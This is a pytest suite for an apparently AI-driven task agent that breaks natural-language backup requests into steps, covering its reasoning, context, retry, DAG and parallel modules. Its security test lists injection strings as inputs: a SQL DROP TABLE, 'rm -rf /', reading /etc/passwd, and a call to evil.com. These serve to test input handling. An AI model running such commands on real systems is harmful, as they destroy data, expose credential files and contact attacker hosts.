import asyncio
import time

import pytest

from plasmaagent.ai.reasoning import ReasoningService, ReasoningRequest, ReasoningPlan
from plasmaagent.ai.decomposer import TaskDecomposer
from plasmaagent.ai.context import ContextManager
from plasmaagent.ai.context.models import ContextVariableType
from plasmaagent.ai.recovery import ErrorAnalyzer
from plasmaagent.ai.dag import DependencyGraph
from plasmaagent.ai.retry import RetryExecutor, RetryConfig
from plasmaagent.ai.parallel import ParallelExecutor, ParallelGroup
from plasmaagent.ai.reasoning.models import StepResult, StepStatus
from plasmaagent.core.database import get_database


@pytest.fixture
async def db():
    database = get_database()
    await database.connect()
    yield database
    await database.disconnect()


class TestSubPhase35EndToEnd:
    async def test_full_reasoning_pipeline(self, db):
        service = ReasoningService()
        
        request = ReasoningRequest(
            natural_language="backup database postgresql then verify backup then notify admin",
            context_variables={"db_name": "plasmaagent"}
        )
        
        plan = service.create_plan(request)
        
        assert isinstance(plan, ReasoningPlan)
        assert plan.session_id is not None
        assert plan.total_steps >= 1
        assert plan.estimated_duration_ms > 0

    async def test_decompose_with_context_substitution(self, db):
        decomposer = TaskDecomposer()
        context_mgr = ContextManager(session_id="session_1")
        
        context_mgr.set_variable("db_host", "localhost", ContextVariableType.CUSTOM)
        context_mgr.set_variable("backup_path", "D:\\backups", ContextVariableType.CUSTOM)
        
        natural_language = "backup database on ${db_host} to ${backup_path}"
        processed = context_mgr.substitute(natural_language)
        
        assert "localhost" in processed
        assert "D:\\backups" in processed
        
        result = decomposer.decompose(processed)
        assert len(result.sub_tasks) >= 1

    async def test_error_recovery_with_retry_integration(self, db):
        error_analyzer = ErrorAnalyzer()
        retry_executor = RetryExecutor(RetryConfig(max_attempts=3, base_delay_seconds=0.01))
        
        error_message = "Permission denied: cannot write to /var/backups"
        analysis = error_analyzer.analyze(error_message, 1)
        
        assert len(analysis.recovery_actions) > 0
        
        attempts = []
        async def failing_then_succeeding():
            attempts.append(1)
            if len(attempts) < 3:
                return (1, "", "Permission denied")
            return (0, "success", "")
        
        result = await retry_executor.execute(failing_then_succeeding)
        assert result.succeeded is True
        assert len(attempts) == 3

    async def test_dag_execution_plan(self, db):
        graph = DependencyGraph()
        
        graph.add_node("task_1", "Backup Database", {"type": "backup"})
        graph.add_node("task_2", "Compress Backup", {"type": "compress"})
        graph.add_node("task_3", "Verify Backup", {"type": "verify"})
        graph.add_node("task_4", "Notify Admin", {"type": "notify"})
        
        graph.add_edge("task_1", "task_2")
        graph.add_edge("task_1", "task_3")
        graph.add_edge("task_2", "task_4")
        graph.add_edge("task_3", "task_4")
        
        assert graph.has_cycle() is False
        
        execution_plan = graph.get_execution_plan()
        assert execution_plan.is_valid is True
        assert execution_plan.node_count >= 4


class TestSubPhase35StressTests:
    async def test_100_concurrent_decompositions(self, db):
        decomposer = TaskDecomposer()
        
        def decompose_task(i: int):
            return decomposer.decompose(f"backup database {i} then verify")
        
        start = time.time()
        results = [decompose_task(i) for i in range(100)]
        duration = time.time() - start
        
        assert len(results) == 100
        assert all(len(r.sub_tasks) >= 1 for r in results)
        assert duration < 10.0

    async def test_context_manager_many_variables(self, db):
        context_mgr = ContextManager(session_id="stress_session")
        
        start = time.time()
        for i in range(500):
            context_mgr.set_variable(f"var_{i}", f"value_{i}", ContextVariableType.CUSTOM)
        
        for i in range(500):
            val = context_mgr.get_variable(f"var_{i}")
            assert val == f"value_{i}"
        
        duration = time.time() - start
        assert duration < 5.0

    async def test_dag_50_nodes_complex(self, db):
        graph = DependencyGraph()
        
        for i in range(50):
            graph.add_node(f"task_{i}", f"Operation {i}", {"type": f"op_{i}"})
        
        for i in range(0, 49, 2):
            graph.add_edge(f"task_{i}", f"task_{i+1}")
        
        for i in range(0, 48, 3):
            graph.add_edge(f"task_{i}", f"task_{i+2}")
        
        assert graph.has_cycle() is False
        
        start = time.time()
        execution_plan = graph.get_execution_plan()
        duration = time.time() - start
        
        assert execution_plan.is_valid is True
        assert execution_plan.node_count >= 50
        assert duration < 2.0


class TestSubPhase35Security:
    async def test_decomposer_injection_attempts(self, db):
        decomposer = TaskDecomposer()
        
        malicious_inputs = [
            "backup database'; DROP TABLE tasks;--",
            "backup && rm -rf /",
            "backup `whoami`",
            "backup $(cat /etc/passwd)",
            "backup; Invoke-WebRequest http://evil.com",
        ]
        
        for mal_input in malicious_inputs:
            result = decomposer.decompose(mal_input)
            assert result is not None

    async def test_context_manager_isolation(self, db):
        context_mgr_a = ContextManager(session_id="session_a")
        context_mgr_b = ContextManager(session_id="session_b")
        
        context_mgr_a.set_variable("secret_key", "secret_a", ContextVariableType.CUSTOM)
        context_mgr_b.set_variable("secret_key", "secret_b", ContextVariableType.CUSTOM)
        
        val_a = context_mgr_a.get_variable("secret_key")
        val_b = context_mgr_b.get_variable("secret_key")
        
        assert val_a == "secret_a"
        assert val_b == "secret_b"
        assert val_a != val_b

    async def test_retry_executor_all_failures(self, db):
        config = RetryConfig(
            max_attempts=3,
            base_delay_seconds=0.01,
            max_delay_seconds=0.1
        )
        executor = RetryExecutor(config)
        
        call_count = []
        
        async def always_failing():
            call_count.append(1)
            return (1, "", "Error occurred")
        
        result = await executor.execute(always_failing)
        assert result.succeeded is False
        assert len(call_count) == 3


class TestSubPhase35Performance:
    async def test_decomposer_performance_long_input(self, db):
        decomposer = TaskDecomposer()
        
        long_input = "backup database " + ("step " * 100) + "then verify"
        
        start = time.time()
        result = decomposer.decompose(long_input)
        duration = time.time() - start
        
        assert duration < 0.5
        assert result is not None

    async def test_error_analyzer_performance(self, db):
        analyzer = ErrorAnalyzer()
        
        start = time.time()
        for i in range(100):
            analyzer.analyze(f"Error {i}: permission denied", 1)
        duration = time.time() - start
        
        assert duration < 2.0

    async def test_parallel_executor_performance(self, db):
        executor = ParallelExecutor()
        
        async def fast_task(step_id: str, **kwargs):
            await asyncio.sleep(0.01)
            return StepResult(
                step_id=step_id,
                natural_language=f"Execute {step_id}",
                status=StepStatus.COMPLETED,
                output="done",
                exit_code=0,
                duration_ms=10
            )
        
        group = ParallelGroup(
            group_id="perf_test",
            step_ids=[f"step_{i}" for i in range(20)],
            max_concurrent=10
        )
        
        start = time.time()
        result = await executor.execute_group(group, fast_task)
        duration = time.time() - start
        
        assert result.all_succeeded() is True
        assert duration < 0.5


class TestSubPhase35CrossPhaseRegression:
    async def test_phase1_database_still_works(self, db):
        async with db.connection() as conn:
            async with conn.cursor() as cursor:
                await cursor.execute("SELECT 1")
                result = await cursor.fetchone()
                assert result is not None

    async def test_subphase_3_4_metrics_still_works(self, db):
        from plasmaagent.ai.metrics.tracker import ExecutionMetricsTracker
        
        tracker = ExecutionMetricsTracker(db)
        
        await tracker.track_execution(
            template_name="test_template",
            execution_time_ms=100,
            success=True,
            commands=["echo test"]
        )
        
        stats = await tracker.get_template_stats("test_template")
        assert stats is not None


class TestSubPhase35EdgeCases:
    async def test_empty_decomposition_raises(self, db):
        decomposer = TaskDecomposer()
        
        with pytest.raises(ValueError):
            decomposer.decompose("")

    async def test_context_manager_nonexistent_variable_returns_none(self, db):
        context_mgr = ContextManager(session_id="test_session")
        
        val = context_mgr.get_variable("nonexistent_var")
        assert val is None

    async def test_retry_executor_immediate_success(self, db):
        executor = RetryExecutor(RetryConfig(max_attempts=3))
        
        async def immediate_success():
            return (0, "success", "")
        
        result = await executor.execute(immediate_success)
        assert result.succeeded is True

    async def test_parallel_executor_single_step(self, db):
        executor = ParallelExecutor()
        
        async def mock_execute(step_id: str, **kwargs):
            return StepResult(
                step_id=step_id,
                natural_language=f"Execute {step_id}",
                status=StepStatus.COMPLETED,
                output="done",
                exit_code=0,
                duration_ms=10
            )
        
        single_group = ParallelGroup(group_id="single", step_ids=["only_step"], max_concurrent=1)
        result = await executor.execute_group(single_group, mock_execute)
        
        assert result.all_succeeded() is True
        assert result.success_count == 1

    async def test_dag_single_node(self, db):
        graph = DependencyGraph()
        graph.add_node("single_task", "Backup Task", {"type": "backup"})
        
        assert graph.has_cycle() is False
        execution_plan = graph.get_execution_plan()
        
        assert execution_plan.is_valid is True
        assert execution_plan.node_count == 1
        assert "single_task" in execution_plan.ordered_nodes

    async def test_reasoning_service_with_complex_input(self, db):
        service = ReasoningService()
        
        request = ReasoningRequest(
            natural_language="1. Backup database\n2. Compress backup\n3. Verify integrity\n4. Upload to S3",
            max_parallel=2,
            max_retries=3,
            timeout_seconds=600.0
        )
        
        plan = service.create_plan(request)
        
        assert plan.total_steps >= 4
        assert plan.estimated_duration_ms > 0

    async def test_error_analyzer_unknown_error(self, db):
        analyzer = ErrorAnalyzer()
        
        analysis = analyzer.analyze("Some completely unknown error message", 99)
        
        assert analysis is not None
        assert len(analysis.recovery_actions) >= 0
